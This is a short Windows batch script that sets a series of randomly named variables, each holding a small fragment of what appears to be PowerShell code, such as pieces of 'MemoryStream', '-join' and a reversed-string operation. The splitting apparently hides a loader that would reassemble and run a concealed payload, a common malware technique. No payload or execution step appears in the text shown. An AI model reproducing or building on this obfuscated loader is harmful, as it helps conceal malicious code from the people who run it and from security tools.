@echo off
set "MLMQmoSJoM=Bmor"
set "fHpazBVrwX=mory"
set "TQlVjHgImJ=.Cre"
set "YXLCKCMkII=($SD"
set "KfRHBvVPWP=V.En"
set "hJxjYkWcOq=oint"
set "RZxQpaluLi=Aj);"
set "zfyFEUrfQZ=TllA"
set "vghmSdAbHX='txe"
set "usTeUWrMrb=SDrX"
set "vKKsMjmMoz=-joi"
set "lHYKhgFueX='[-1"
set "AoBhduLFxX=);$q"
set "KTGpucXZMP=; };"
